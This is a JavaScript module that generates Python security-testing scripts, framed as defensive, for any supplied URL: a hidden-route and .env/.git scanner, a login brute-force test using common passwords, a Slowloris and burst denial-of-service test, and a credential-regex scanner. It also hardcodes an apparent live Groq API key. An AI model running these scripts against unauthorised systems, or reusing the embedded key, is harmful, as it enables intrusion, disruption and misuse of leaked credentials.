/*  ═══════════════════════════════════════════════════════════════════
    PYTHON SCRIPTS GENERATOR — Blue Team Defense Scripts
    Gera scripts Python funcionais para cada tipo de vulnerabilidade
    encontrada na auditoria. Scripts são para fins defensivos/blue team.
    ═══════════════════════════════════════════════════════════════════ */

const fetch = require('node-fetch');

const GROQ_API_KEY = process.env.GROQ_API_KEY || process.env.GROK_API_KEY || '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';
const GROQ_API_URL = 'https://api.groq.com/openai/v1/chat/completions';
const MODEL = 'llama-3.3-70b-versatile';

// ═══════════════════════════════════════════════════════════════════
// PYTHON SCRIPT TEMPLATES — 100% Funcionais, Blue Team Only
// ═══════════════════════════════════════════════════════════════════

const SCRIPT_TEMPLATES = {

  // ── 1. Hidden Route & Endpoint Discovery ──────────────────────────
  route_scanner: {
    id: 'route_scanner',
    name: 'Hidden Route Scanner',
    category: 'Reconhecimento',
    severity: 'high',
    description: 'Descobre rotas ocultas, painéis admin, endpoints de API, arquivos de configuração e backup expostos.',
    icon: '🗺️',
    dependencies: ['requests'],
    template: (url) => `#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — Hidden Route & Endpoint Discovery               ║
║  Propósito: Testar se rotas ocultas estão acessíveis         ║
║  Alvo: ${url}
║  Uso: python route_scanner.py [URL]                          ║
╚══════════════════════════════════════════════════════════════╝
"""

import sys
import time
import json
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
from datetime import datetime

requests.packages.urllib3.disable_warnings()

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"
TIMEOUT    = 8
THREADS    = 10
DELAY      = 0.05  # delay entre batches (segundos)

# Wordlist completa de rotas sensíveis
ROUTES = {
    "admin": [
        "/admin", "/admin/", "/admin/login", "/admin/dashboard", "/admin/users",
        "/admin/settings", "/admin/config", "/administrator", "/admin-panel",
        "/_admin", "/cp", "/manage", "/backoffice", "/cms", "/portal",
        "/controlpanel", "/webadmin", "/superadmin", "/root", "/adm",
    ],
    "api": [
        "/api", "/api/v1", "/api/v2", "/api/v3", "/api/health", "/api/status",
        "/api/users", "/api/admin", "/api/config", "/api/env", "/api/debug",
        "/api/keys", "/api/tokens", "/api/secrets", "/api/internal", "/api/private",
        "/api/docs", "/api/swagger", "/api/graphql", "/v1", "/v2", "/v3",
    ],
    "debug": [
        "/debug", "/debug/vars", "/debug/info", "/_debug", "/trace",
        "/console", "/metrics", "/_metrics", "/stats", "/monitor",
        "/status", "/health", "/info", "/server-info",
        "/actuator", "/actuator/env", "/actuator/health", "/actuator/info",
        "/phpinfo", "/phpinfo.php", "/.env", "/.env.local", "/.env.production",
    ],
    "config": [
        "/package.json", "/composer.json", "/Dockerfile", "/docker-compose.yml",
        "/.gitignore", "/.git/config", "/.git/HEAD", "/wp-config.php",
        "/web.config", "/.htaccess", "/.htpasswd", "/nginx.conf",
        "/application.yml", "/application.properties", "/vercel.json",
        "/netlify.toml", "/.env.example", "/.env.sample",
    ],
    "backup": [
        "/backup", "/backup.sql", "/dump.sql", "/database.sql", "/db.sql",
        "/backup.zip", "/backup.tar.gz", "/site.zip", "/db.sqlite",
        "/data.sql", "/export.sql", "/old", "/_old", "/archive",
    ],
    "auth": [
        "/login", "/signin", "/auth/login", "/oauth/token", "/token",
        "/jwt", "/session", "/sso", "/saml", "/.auth/me",
        "/forgot-password", "/reset-password", "/auth/v1/token",
        "/auth/v1/settings", "/auth/v1/admin/users",
    ],
    "monitoring": [
        "/prometheus", "/grafana", "/grafana/login", "/netdata",
        "/portainer", "/kibana", "/jaeger", "/traefik",
        "/_/healthy", "/-/ready", "/-/reload",
    ],
    "php": [
        "/phpmyadmin", "/pma", "/adminer.php", "/adminer",
        "/phpinfo.php", "/info.php", "/config.php", "/install.php",
        "/wp-login.php", "/wp-admin", "/wp-json/wp/v2/users",
        "/xmlrpc.php",
    ],
    "git": [
        "/.git/HEAD", "/.git/config", "/.git/index",
        "/.git/COMMIT_EDITMSG", "/.gitignore", "/.svn/entries",
    ],
    "network": [
        "/vpn", "/tailscale", "/wireguard", "/wg/status",
        "/mesh", "/tunnel", "/netmgmt", "/mgmt",
    ],
}

RISK_MAP = {
    "admin": "CRÍTICO", "debug": "CRÍTICO", "git": "CRÍTICO",
    "backup": "CRÍTICO", "config": "ALTO", "php": "ALTO",
    "api": "MÉDIO", "auth": "MÉDIO", "monitoring": "ALTO",
    "network": "ALTO",
}

def check_baseline(url):
    """Obtém assinatura da página 404 para evitar falsos positivos."""
    try:
        r = requests.get(
            url + "/this-does-not-exist-xyzzy-99999",
            timeout=TIMEOUT, verify=False, allow_redirects=True
        )
        return r.status_code, len(r.text), hash(r.text[:500])
    except Exception:
        return 404, 0, 0

def probe_route(base, route, baseline):
    """Testa uma rota e retorna resultado se for real."""
    url = base.rstrip("/") + route
    try:
        r = requests.get(url, timeout=TIMEOUT, verify=False,
                         allow_redirects=True,
                         headers={"User-Agent": "BlueTeam-SecurityTest/1.0"})

        b_status, b_len, b_hash = baseline

        # Ignora 404 explícitos
        if r.status_code == 404:
            return None
        # Ignora respostas identicas ao baseline (soft 404)
        if hash(r.text[:500]) == b_hash and len(r.text) == b_len:
            return None
        # Resposta real
        if r.status_code in [200, 301, 302, 401, 403, 405, 500]:
            return {
                "url": url,
                "route": route,
                "status": r.status_code,
                "size": len(r.text),
                "server": r.headers.get("server", ""),
                "content_type": r.headers.get("content-type", ""),
                "auth_required": r.status_code in [401, 403],
                "redirect": r.headers.get("location", "") if r.status_code in [301, 302] else "",
            }
    except Exception:
        pass
    return None

def main():
    base = TARGET_URL.rstrip("/")
    if not base.startswith("http"):
        base = "https://" + base

    parsed = urlparse(base)
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — Hidden Route Scanner                            ║
╠══════════════════════════════════════════════════════════════╣
║  Alvo  : {base:<52}║
║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
╚══════════════════════════════════════════════════════════════╝
""")

    print("[*] Obtendo baseline 404...")
    baseline = check_baseline(base)
    print(f"[*] Baseline: status={baseline[0]}, tamanho={baseline[1]}")
    print()

    all_routes = []
    for cat, routes in ROUTES.items():
        for r in routes:
            all_routes.append((cat, r))

    print(f"[*] Testando {len(all_routes)} rotas com {THREADS} threads...")
    print("-" * 64)

    found = []
    critical = []

    with ThreadPoolExecutor(max_workers=THREADS) as exe:
        futures = {
            exe.submit(probe_route, base, route, baseline): (cat, route)
            for cat, route in all_routes
        }
        for future in as_completed(futures):
            cat, route = futures[future]
            result = future.result()
            if result:
                result["category"] = cat
                result["risk"] = RISK_MAP.get(cat, "BAIXO")
                found.append(result)

                icon = "🔴" if result["risk"] == "CRÍTICO" else ("🟡" if result["risk"] == "ALTO" else "🔵")
                auth = " [REQUER AUTH]" if result["auth_required"] else " [PÚBLICO]"
                print(f"{icon} [{result['risk']:8}] {result['status']} {result['route']}{auth}")

                if result["risk"] == "CRÍTICO":
                    critical.append(result)

    print()
    print("=" * 64)
    print(f"  RESULTADO: {len(found)} rota(s) encontrada(s)")
    print(f"  CRÍTICAS : {len(critical)}")
    print(f"  Alvo     : {base}")
    print("=" * 64)

    if critical:
        print()
        print("🚨 ROTAS CRÍTICAS ENCONTRADAS:")
        for r in critical:
            print(f"   {r['status']} {r['url']}")

    # Salva resultado JSON
    output = {
        "target": base,
        "timestamp": datetime.now().isoformat(),
        "total_found": len(found),
        "critical_count": len(critical),
        "routes": found
    }
    with open("route_scan_results.json", "w") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)
    print()
    print(f"[✓] Resultados salvos em: route_scan_results.json")

if __name__ == "__main__":
    main()
`
  },

  // ── 2. Brute Force & Rate Limiting Defense Test ───────────────────
  brute_force_test: {
    id: 'brute_force_test',
    name: 'Brute Force Protection Test',
    category: 'Autenticação',
    severity: 'critical',
    description: 'Verifica se endpoints de login têm proteção contra força bruta: rate limiting, lockout, resposta consistente.',
    icon: '🔓',
    dependencies: ['requests'],
    template: (url) => `#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — Brute Force & Rate Limiting Protection Test     ║
║  Propósito: Verificar proteção contra ataques de força bruta ║
║  Alvo: ${url}
║  Uso: python brute_force_test.py [URL]                       ║
╚══════════════════════════════════════════════════════════════╝
"""

import sys
import time
import json
import requests
from datetime import datetime

requests.packages.urllib3.disable_warnings()

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"
TIMEOUT = 8

# Senhas comuns para teste de proteção
COMMON_PASSWORDS = [
    "password", "123456", "12345678", "qwerty", "abc123",
    "password1", "admin", "letmein", "welcome", "monkey",
    "admin123", "root", "toor", "changeme", "secret",
    "password123", "P@ssw0rd", "Admin@123", "test", "test1234",
]

TEST_EMAILS = [
    "test@blueteam.local",
    "admin@blueteam.local",
    "security@blueteam.local",
]

AUTH_ENDPOINTS = [
    "/auth/v1/token?grant_type=password",
    "/api/auth/login",
    "/api/login",
    "/login",
    "/auth/login",
    "/signin",
]

def detect_rate_limit_headers(headers):
    """Detecta headers de rate limiting na resposta."""
    rl_headers = [
        "x-ratelimit-limit", "x-ratelimit-remaining", "x-ratelimit-reset",
        "ratelimit-limit", "retry-after", "x-retry-after", "x-rate-limit",
        "x-throttle-wait-seconds",
    ]
    found = {}
    for k, v in headers.items():
        if k.lower() in rl_headers:
            found[k] = v
    return found

def test_endpoint_exists(base, path):
    """Verifica se o endpoint responde."""
    url = base.rstrip("/") + path
    try:
        r = requests.get(url, timeout=TIMEOUT, verify=False,
                         headers={"User-Agent": "BlueTeam-SecurityTest/1.0"})
        return r.status_code not in [404]
    except Exception:
        return False

def test_login_brute_force(base, endpoint):
    """Testa proteção de um endpoint de login contra força bruta."""
    url = base.rstrip("/") + endpoint
    results = {
        "endpoint": url,
        "attempts": [],
        "rate_limited": False,
        "rate_limit_at": None,
        "lockout_detected": False,
        "consistent_response": True,
        "rate_limit_headers": {},
        "timing_consistent": True,
    }

    print(f"  → Testando: {endpoint}")

    response_times = []
    first_body = None
    consistent = True

    for i, password in enumerate(COMMON_PASSWORDS[:15]):
        email = TEST_EMAILS[i % len(TEST_EMAILS)]
        payload = {
            "email": email,
            "password": password,
            "username": email.split("@")[0],
            "log": email.split("@")[0],
            "pwd": password,
        }

        t0 = time.time()
        try:
            r = requests.post(url, json=payload, timeout=TIMEOUT,
                              verify=False, allow_redirects=False,
                              headers={
                                  "User-Agent": "BlueTeam-SecurityTest/1.0",
                                  "Content-Type": "application/json",
                              })
            elapsed = round((time.time() - t0) * 1000)
            response_times.append(elapsed)

            attempt = {
                "attempt": i + 1,
                "status": r.status_code,
                "ms": elapsed,
                "password_tried": password,
            }
            results["attempts"].append(attempt)

            # Detecta rate limit
            rl = detect_rate_limit_headers(dict(r.headers))
            if rl:
                results["rate_limit_headers"] = rl

            if r.status_code == 429:
                results["rate_limited"] = True
                results["rate_limit_at"] = i + 1
                print(f"    ✅ Rate limit (429) na tentativa {i+1}!")
                break

            # Detecta lockout
            body_lower = r.text.lower()
            if any(w in body_lower for w in ["locked", "too many", "blocked", "suspended"]):
                results["lockout_detected"] = True
                print(f"    ✅ Lockout detectado na tentativa {i+1}!")
                break

            # Verifica consistência da resposta (anti-timing attack)
            if first_body is None:
                first_body = r.status_code
            elif r.status_code != first_body:
                consistent = False

            print(f"    [{i+1:2d}] {r.status_code} em {elapsed}ms")

        except requests.exceptions.Timeout:
            print(f"    [{i+1:2d}] TIMEOUT")
            break
        except Exception as e:
            print(f"    [{i+1:2d}] ERRO: {e}")
            break

        time.sleep(0.15)

    # Analisa consistência de timing (proteção anti-timing attack)
    if len(response_times) >= 5:
        avg = sum(response_times) / len(response_times)
        max_dev = max(abs(t - avg) for t in response_times)
        results["timing_consistent"] = max_dev < avg * 0.5
        results["avg_response_ms"] = round(avg)
        results["timing_deviation_ms"] = round(max_dev)

    results["consistent_response"] = consistent
    return results

def test_username_enumeration(base):
    """Testa se o sistema vaza informação sobre usuários válidos via timing."""
    endpoint = "/auth/v1/recover"
    url = base.rstrip("/") + endpoint

    print(f"  → Testando enumeração de usuários via timing: {endpoint}")

    valid_times = []
    invalid_times = []

    # Emails que podem ser válidos
    test_emails = ["admin@admin.com", "admin@test.com", "test@example.com"]
    # Emails claramente inválidos
    fake_emails = [f"xyznotreal{i}@fakefake.invalid" for i in range(3)]

    for email in test_emails:
        try:
            t0 = time.time()
            requests.post(url, json={"email": email}, timeout=TIMEOUT,
                         verify=False, headers={"User-Agent": "BlueTeam-SecurityTest/1.0"})
            valid_times.append((time.time() - t0) * 1000)
        except Exception:
            pass
        time.sleep(0.2)

    for email in fake_emails:
        try:
            t0 = time.time()
            requests.post(url, json={"email": email}, timeout=TIMEOUT,
                         verify=False, headers={"User-Agent": "BlueTeam-SecurityTest/1.0"})
            invalid_times.append((time.time() - t0) * 1000)
        except Exception:
            pass
        time.sleep(0.2)

    if valid_times and invalid_times:
        avg_valid = sum(valid_times) / len(valid_times)
        avg_invalid = sum(invalid_times) / len(invalid_times)
        diff = abs(avg_valid - avg_invalid)
        pct = (diff / avg_invalid * 100) if avg_invalid > 0 else 0

        vulnerable = diff > 200 and pct > 50
        return {
            "endpoint": url,
            "avg_valid_ms": round(avg_valid),
            "avg_invalid_ms": round(avg_invalid),
            "diff_ms": round(diff),
            "diff_percent": round(pct),
            "timing_attack_possible": vulnerable,
        }
    return {"endpoint": url, "error": "Endpoint não respondeu"}

def main():
    base = TARGET_URL.rstrip("/")
    if not base.startswith("http"):
        base = "https://" + base

    print(f"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — Brute Force Protection Test                     ║
╠══════════════════════════════════════════════════════════════╣
║  Alvo  : {base:<52}║
║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
╚══════════════════════════════════════════════════════════════╝
""")

    # Descobre endpoints ativos
    print("[*] Detectando endpoints de autenticação...")
    active_endpoints = [ep for ep in AUTH_ENDPOINTS if test_endpoint_exists(base, ep)]
    print(f"[*] {len(active_endpoints)} endpoint(s) encontrado(s): {active_endpoints or 'Nenhum'}")
    print()

    all_results = []
    protected_count = 0

    # Testa cada endpoint
    for endpoint in active_endpoints[:3]:  # Limita a 3 para não ser intrusivo
        print(f"[*] Testando endpoint: {endpoint}")
        result = test_login_brute_force(base, endpoint)
        all_results.append(result)

        is_protected = result["rate_limited"] or result["lockout_detected"] or bool(result["rate_limit_headers"])
        if is_protected:
            protected_count += 1
            print(f"  ✅ PROTEGIDO — Rate limit ou lockout ativo")
        else:
            print(f"  ⚠️  SEM PROTEÇÃO — {len(result['attempts'])} tentativas sem bloqueio")
        print()

    # Testa enumeração de usuários
    print("[*] Testando enumeração de usuários por timing...")
    enum_result = test_username_enumeration(base)

    if enum_result.get("timing_attack_possible"):
        print(f"  ⚠️  VULNERÁVEL — Diferença de timing: {enum_result['diff_ms']}ms ({enum_result['diff_percent']}%)")
    else:
        print(f"  ✅ PROTEGIDO — Timing consistente entre usuários válidos/inválidos")
    print()

    # Resumo final
    print("=" * 64)
    print("  RESUMO DA ANÁLISE")
    print("=" * 64)
    print(f"  Endpoints testados  : {len(all_results)}")
    print(f"  Com proteção        : {protected_count}")
    print(f"  Sem proteção        : {len(all_results) - protected_count}")
    print(f"  Timing attack       : {'SIM ⚠️' if enum_result.get('timing_attack_possible') else 'NÃO ✅'}")

    if protected_count < len(all_results):
        print()
        print("  🔴 RECOMENDAÇÃO: Implemente rate limiting nos endpoints sem proteção.")
        print("     Supabase: Ative 'Rate Limiting' em Authentication > Settings")
        print("     Nginx: use limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;")

    output = {
        "target": base,
        "timestamp": datetime.now().isoformat(),
        "protected": protected_count,
        "total_tested": len(all_results),
        "endpoints": all_results,
        "enumeration_test": enum_result,
    }
    with open("brute_force_results.json", "w") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)
    print()
    print(f"[✓] Resultados salvos em: brute_force_results.json")

if __name__ == "__main__":
    main()
`
  },

  // ── 3. DoS Resilience Test ────────────────────────────────────────
  dos_test: {
    id: 'dos_test',
    name: 'DoS / DDoS Resilience Test',
    category: 'Disponibilidade',
    severity: 'high',
    description: 'Testa resiliência do servidor contra Slowloris, burst de requisições, payloads grandes e esgotamento de conexões.',
    icon: '🌊',
    dependencies: ['requests'],
    template: (url) => `#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — DoS / DDoS Resilience Test                      ║
║  Propósito: Verificar resiliência contra ataques de negação   ║
║  de serviço. Teste controlado e não destrutivo.              ║
║  Alvo: ${url}
║  Uso: python dos_test.py [URL]                               ║
╚══════════════════════════════════════════════════════════════╝
"""

import sys
import time
import socket
import ssl
import threading
import json
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from statistics import mean, stdev

requests.packages.urllib3.disable_warnings()

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"
TIMEOUT = 8

def parse_url(url):
    from urllib.parse import urlparse
    p = urlparse(url if url.startswith("http") else "https://" + url)
    return p.hostname, p.port or (443 if p.scheme == "https" else 80), p.scheme == "https"

def single_get(url):
    """Faz uma única requisição e retorna (status, ms, error)."""
    t0 = time.time()
    try:
        r = requests.get(url, timeout=TIMEOUT, verify=False,
                         headers={"User-Agent": "BlueTeam-SecurityTest/1.0"})
        return r.status_code, round((time.time() - t0) * 1000), None
    except requests.exceptions.Timeout:
        return 0, round((time.time() - t0) * 1000), "timeout"
    except Exception as e:
        return 0, round((time.time() - t0) * 1000), str(e)[:40]

# ── Teste 1: Latência Baseline ─────────────────────────────────────
def test_baseline_latency(url, n=10):
    print(f"[*] Teste 1: Medindo latência baseline ({n} requisições sequenciais)...")
    times = []
    statuses = []

    for i in range(n):
        status, ms, err = single_get(url)
        if ms > 0:
            times.append(ms)
            statuses.append(status)
        print(f"  [{i+1:2d}] {status or 'ERR':>3} — {ms}ms {'⚠️' if ms > 2000 else '✅'}")
        time.sleep(0.2)

    result = {
        "test": "baseline_latency",
        "samples": n,
        "avg_ms": round(mean(times)) if times else 0,
        "max_ms": max(times) if times else 0,
        "min_ms": min(times) if times else 0,
        "jitter_ms": round(stdev(times)) if len(times) > 1 else 0,
        "success_rate": len([s for s in statuses if 200 <= s < 500]) / n * 100,
    }

    if result["avg_ms"] > 3000:
        result["status"] = "CRÍTICO"; result["msg"] = f"Latência muito alta: {result['avg_ms']}ms"
    elif result["avg_ms"] > 1500:
        result["status"] = "ALERTA"; result["msg"] = f"Latência elevada: {result['avg_ms']}ms"
    else:
        result["status"] = "OK"; result["msg"] = f"Latência normal: {result['avg_ms']}ms"

    print(f"  → Avg: {result['avg_ms']}ms | Max: {result['max_ms']}ms | Jitter: ±{result['jitter_ms']}ms")
    return result

# ── Teste 2: Burst Concorrente ─────────────────────────────────────
def test_concurrent_burst(url, n=25):
    print(f"\\n[*] Teste 2: Burst concorrente ({n} requisições simultâneas)...")

    with ThreadPoolExecutor(max_workers=n) as exe:
        futures = [exe.submit(single_get, url) for _ in range(n)]
        results = [f.result() for f in as_completed(futures)]

    statuses = [r[0] for r in results]
    times = [r[1] for r in results if r[1] > 0]

    status_429 = statuses.count(429)
    status_503 = statuses.count(503)
    timeouts = sum(1 for r in results if r[2] == "timeout")
    errors = sum(1 for r in results if r[2] and r[2] != "timeout")
    success = sum(1 for s in statuses if 200 <= s < 500)

    print(f"  ✅ Sucesso: {success}/{n}")
    print(f"  ⏱  Rate limited (429): {status_429}")
    print(f"  ⚠️  Serviço indisponível (503): {status_503}")
    print(f"  ⏳ Timeouts: {timeouts}")
    print(f"  ❌ Erros: {errors}")

    throttled = status_429 > 0 or status_503 > 0
    result = {
        "test": "concurrent_burst",
        "concurrent": n,
        "success": success,
        "rate_limited_429": status_429,
        "unavailable_503": status_503,
        "timeouts": timeouts,
        "errors": errors,
        "avg_ms": round(mean(times)) if times else 0,
        "throttling_active": throttled,
    }

    if throttled:
        result["status"] = "OK"; result["msg"] = f"Rate limiting ativo ({status_429} bloqueados)"
    elif timeouts >= n * 0.3:
        result["status"] = "CRÍTICO"; result["msg"] = f"{timeouts} timeouts — servidor sobrecarregado"
    elif errors >= n * 0.3:
        result["status"] = "ALERTA"; result["msg"] = f"{errors} erros sob carga"
    else:
        result["status"] = "OK"; result["msg"] = "Servidor estável sob burst"

    return result

# ── Teste 3: Slowloris Simulation ─────────────────────────────────
def test_slowloris(host, port, is_https, n=5, hold_secs=4):
    print(f"\\n[*] Teste 3: Slowloris simulation ({n} conexões por {hold_secs}s)...")

    results = []

    def slow_connect():
        t0 = time.time()
        try:
            sock = socket.create_connection((host, port), timeout=5)
            if is_https:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)

            # Envia cabeçalho HTTP incompleto (Slowloris)
            sock.sendall(f"GET / HTTP/1.1\\r\\nHost: {host}\\r\\nConnection: keep-alive\\r\\n".encode())

            # Tenta manter conexão aberta
            time.sleep(hold_secs)
            sock.close()
            return {"held_ms": round((time.time() - t0) * 1000), "closed_by": "client"}
        except Exception as e:
            return {"held_ms": round((time.time() - t0) * 1000), "closed_by": "server", "reason": str(e)[:40]}

    with ThreadPoolExecutor(max_workers=n) as exe:
        futures = [exe.submit(slow_connect) for _ in range(n)]
        results = [f.result() for f in as_completed(futures)]

    server_closed = sum(1 for r in results if r.get("closed_by") == "server")
    client_held = sum(1 for r in results if r.get("closed_by") == "client")
    avg_held = round(mean(r["held_ms"] for r in results))

    print(f"  Conexões fechadas pelo servidor: {server_closed}/{n}")
    print(f"  Conexões mantidas pelo cliente : {client_held}/{n}")
    print(f"  Tempo médio de hold: {avg_held}ms")

    vulnerable = client_held >= n * 0.6 and avg_held >= hold_secs * 1000 * 0.8

    result = {
        "test": "slowloris",
        "connections": n,
        "hold_seconds": hold_secs,
        "server_closed": server_closed,
        "client_held": client_held,
        "avg_held_ms": avg_held,
        "potentially_vulnerable": vulnerable,
    }

    if vulnerable:
        result["status"] = "ALERTA"
        result["msg"] = f"Servidor manteve {client_held}/{n} conexões incompletas — possível vulnerabilidade Slowloris"
    else:
        result["status"] = "OK"
        result["msg"] = f"Servidor fechou conexões incompletas (Slowloris resistente)"

    return result

# ── Teste 4: Large Payload ─────────────────────────────────────────
def test_large_payload(url):
    print("\\n[*] Teste 4: Large payload (1KB, 100KB, 1MB)...")

    results = []
    for size, label in [(1024, "1KB"), (102400, "100KB"), (1048576, "1MB")]:
        payload = {"data": "A" * size}
        t0 = time.time()
        try:
            r = requests.post(url, json=payload, timeout=10, verify=False,
                              headers={"User-Agent": "BlueTeam-SecurityTest/1.0"})
            ms = round((time.time() - t0) * 1000)
            rejected = r.status_code in [413, 400, 422]
            print(f"  {label:6} → {r.status_code} em {ms}ms {'✅ Rejeitado' if rejected else '⚠️ Aceito'}")
            results.append({"size": label, "bytes": size, "status": r.status_code, "ms": ms, "rejected": rejected})
        except Exception as e:
            ms = round((time.time() - t0) * 1000)
            print(f"  {label:6} → ERRO ({str(e)[:30]}) em {ms}ms")
            results.append({"size": label, "bytes": size, "status": 0, "ms": ms, "error": str(e)[:40]})

    accepted_large = [r for r in results if not r.get("rejected") and r["bytes"] >= 102400]
    return {
        "test": "large_payload",
        "results": results,
        "status": "ALERTA" if accepted_large else "OK",
        "msg": f"Aceita payloads de até {accepted_large[-1]['size']}" if accepted_large else "Limites de payload configurados",
    }

def main():
    base = TARGET_URL.rstrip("/")
    if not base.startswith("http"):
        base = "https://" + base

    host, port, is_https = parse_url(base)

    print(f"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — DoS / DDoS Resilience Test                      ║
╠══════════════════════════════════════════════════════════════╣
║  Alvo  : {base:<52}║
║  Host  : {host:<52}║
║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
╚══════════════════════════════════════════════════════════════╝
""")

    all_results = []

    r1 = test_baseline_latency(base)
    all_results.append(r1)

    r2 = test_concurrent_burst(base)
    all_results.append(r2)

    r3 = test_slowloris(host, port, is_https)
    all_results.append(r3)

    r4 = test_large_payload(base)
    all_results.append(r4)

    # Resumo
    print()
    print("=" * 64)
    print("  RESUMO DOS TESTES DoS")
    print("=" * 64)
    for r in all_results:
        icon = "✅" if r.get("status") == "OK" else ("🔴" if r.get("status") == "CRÍTICO" else "⚠️")
        print(f"  {icon} {r['test']:25} → {r.get('msg', '')}")

    issues = [r for r in all_results if r.get("status") != "OK"]
    if not issues:
        print()
        print("  ✅ Servidor demonstra boa resiliência a ataques DoS testados.")
    else:
        print()
        print("  ⚠️  RECOMENDAÇÕES:")
        for r in issues:
            print(f"     • {r.get('msg', '')}")

    output = {
        "target": base,
        "timestamp": datetime.now().isoformat(),
        "tests": all_results,
    }
    with open("dos_test_results.json", "w") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)
    print()
    print(f"[✓] Resultados salvos em: dos_test_results.json")

if __name__ == "__main__":
    main()
`
  },

  // ── 4. Credential & .env Exposure Scanner ─────────────────────────
  credential_scanner: {
    id: 'credential_scanner',
    name: 'Credential & .env Exposure Scanner',
    category: 'Credenciais',
    severity: 'critical',
    description: 'Varre o site em busca de chaves API, tokens, arquivos .env, credenciais expostas no código-fonte e respostas HTTP.',
    icon: '🔑',
    dependencies: ['requests'],
    template: (url) => `#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — Credential & .env Exposure Scanner              ║
║  Propósito: Encontrar credenciais e chaves expostas          ║
║  Alvo: ${url}
║  Uso: python credential_scanner.py [URL]                     ║
╚══════════════════════════════════════════════════════════════╝
"""

import sys
import re
import json
import requests
from datetime import datetime
from urllib.parse import urljoin, urlparse

requests.packages.urllib3.disable_warnings()

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"
TIMEOUT = 10

# Padrões de credenciais e tokens sensíveis
CREDENTIAL_PATTERNS = {
    "Supabase Anon Key":   r'eyJ[a-zA-Z0-9_-]{20,}\\.eyJ[a-zA-Z0-9_-]{20,}\\.[a-zA-Z0-9_-]{20,}',
    "JWT Token":           r'eyJ[a-zA-Z0-9_-]+\\.eyJ[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+',
    "AWS Access Key":      r'AKIA[0-9A-Z]{16}',
    "AWS Secret Key":      r'(?i)aws[_\\s]?secret[_\\s]?(?:access[_\\s]?)?key[\\s]*[=:][\\s]*["\']?([A-Za-z0-9+/]{40})',
    "GitHub Token":        r'gh[pousr]_[A-Za-z0-9]{36}',
    "Stripe Secret Key":   r'sk_(?:live|test)_[A-Za-z0-9]{20,}',
    "Stripe Publishable":  r'pk_(?:live|test)_[A-Za-z0-9]{20,}',
    "Google API Key":      r'AIza[0-9A-Za-z\\-_]{35}',
    "Slack Token":         r'xox[baprs]-[0-9A-Za-z]{10,48}',
    "Private Key Header":  r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',
    "DB Connection String": r'(?:mysql|postgres|mongodb|redis|postgresql)://[^\\s"\'<>]+',
    "API Key Generic":     r'(?i)(?:api[_-]?key|apikey|api[_-]?secret)[\\s]*[=:][\\s]*["\']?([A-Za-z0-9_\\-]{20,})',
    "Password in URL":     r'(?i)(?:password|passwd|pwd)[=:][^&\\s"\'<>]{4,}',
    "Bearer Token":        r'Bearer\\s+[A-Za-z0-9\\-_\\.]{20,}',
    "Basic Auth":          r'Basic\\s+[A-Za-z0-9+/=]{10,}',
    "Supabase URL":        r'https://[a-z0-9]{20}\\.supabase\\.co',
    "Firebase Config":     r'firebase[A-Za-z]*:\\s*["\'][^"\']{20,}["\']',
    "Sendgrid Key":        r'SG\\.[A-Za-z0-9_-]{22}\\.[A-Za-z0-9_-]{43}',
    "Twilio":              r'SK[0-9a-fA-F]{32}',
    "Heroku API":          r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}',
}

# Caminhos para verificar exposição
SENSITIVE_PATHS = [
    "/.env", "/.env.local", "/.env.production", "/.env.development",
    "/.env.example", "/.env.sample", "/.env.bak", "/.env.old",
    "/env", "/config", "/config.json", "/config.yml", "/config.yaml",
    "/settings.json", "/secrets.json", "/credentials.json",
    "/package.json", "/composer.json", "/Gemfile",
    "/.git/config", "/.git/HEAD",
    "/wp-config.php", "/wp-config-sample.php",
    "/application.properties", "/application.yml",
    "/database.yml", "/database.json",
    "/.npmrc", "/.yarnrc",
    "/serverless.yml", "/fly.toml", "/render.yaml",
    "/docker-compose.yml", "/docker-compose.yaml",
    "/Makefile", "/Procfile",
]

def mask_secret(value, show=6):
    """Mascara uma chave para exibição segura."""
    if len(value) <= show * 2:
        return "*" * len(value)
    return value[:show] + "..." + value[-show:]

def scan_content(content, source):
    """Varre conteúdo em busca de credenciais."""
    findings = []
    for pattern_name, pattern in CREDENTIAL_PATTERNS.items():
        matches = re.findall(pattern, content)
        for match in matches:
            value = match if isinstance(match, str) else match[0] if match else ""
            if len(value) < 10:
                continue
            findings.append({
                "type": pattern_name,
                "source": source,
                "masked_value": mask_secret(value),
                "length": len(value),
                "severity": "CRÍTICO" if any(k in pattern_name for k in ["Private", "Secret", "Password", "Service"]) else "ALTO",
            })
    return findings

def check_path(base, path):
    """Verifica um caminho específico."""
    url = base.rstrip("/") + path
    try:
        r = requests.get(url, timeout=TIMEOUT, verify=False,
                         headers={"User-Agent": "BlueTeam-SecurityTest/1.0"})
        if r.status_code == 200 and len(r.text) > 10:
            return r.status_code, r.text, r.headers.get("content-type", "")
        return r.status_code, "", ""
    except Exception:
        return 0, "", ""

def scan_js_bundles(base, html_content):
